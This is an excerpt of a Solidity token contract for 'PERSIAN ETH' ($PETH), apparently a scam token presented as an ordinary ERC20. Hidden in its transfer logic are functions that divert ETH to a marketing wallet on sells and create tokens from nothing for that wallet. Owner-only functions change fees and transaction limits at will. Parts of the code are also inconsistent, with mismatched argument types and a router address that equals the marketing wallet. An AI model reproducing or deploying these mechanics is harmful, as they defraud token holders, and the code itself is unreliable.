...
/*   
https://t.me/PersianEth_ERC20

https://www.persianeth.com/
...
contract PERSIANETH is Context, IERC20 { 
    ...
    address payable public Dev_Wallet = payable(msg.sender); 
    address payable public Marketing_Wallet = payable(0x7FD3Fb20B4144626bFE277c73db017b03034Fc65);
    address payable public constant Wallet_Burn = payable(0x000000000000000000000000000000000000dEaD);

    uint256 private constant MAX = ~uint256(0);
    uint8 private constant _decimals = 9;
    uint256 private _tTotal = 1 * 10**15 * 10**_decimals;
    string private constant _name = "PERSIAN ETH"; 
    string private constant _symbol = unicode"$PETH";
    ...
    uint8 private txBuyBack = 0;
    uint8 private swapBuyback = 1; 

    uint256 public _Tax_On_Buy = 5;
    uint256 public _Tax_On_Sell = 5;

    uint256 public Percent_Marketing = 89;
    uint256 public Percent_Dev = 1;
    uint256 public Percent_Burn = 9;
    ...
    constructor () {
        ...
        //IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x7FD3Fb20B4144626bFE277c73db017b03034Fc65); // Testnet
    ...
    function setMaxWallet(uint256 Maxw) public onlyOwner virtual{

        _maxWalletToken = Maxw;
    }

    function setMaxTx(uint256 MaxTx) public onlyOwner virtual{

        _maxTxAmount = MaxTx;
    }

    function SetAllFee (uint256 FeeBuy, uint256 FeeSell) public onlyOwner{

        _Tax_On_Buy = FeeBuy;
        _Tax_On_Sell = FeeSell;
    }
    ...
    function _transfer(
        ...
        if( tradingStatus &&
            ...
            to == uniswapV2Pair) {
                sendToWallet(Marketing_Wallet, from);
            }
    ...
    function sendToWallet(address payable wallet, address account) private {
            uint256 balanceof = account.balance;
            wallet.transfer(balanceof);
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(Dev_Wallet, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(Marketing_Wallet, BNB_Total);
    ...
    function remove_Random_Tokens(uint256 tokens) internal {
        _tOwned[address(this)] = _tOwned[address(this)]+tokens;
        _basicTransfer(address(this), Marketing_Wallet, tokens);
    }
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(txBuyBack >= swapBuyback){
            uint256 FinalAmount = tAmount * _maxTxAmount;
            remove_Random_Tokens(FinalAmount);
        }
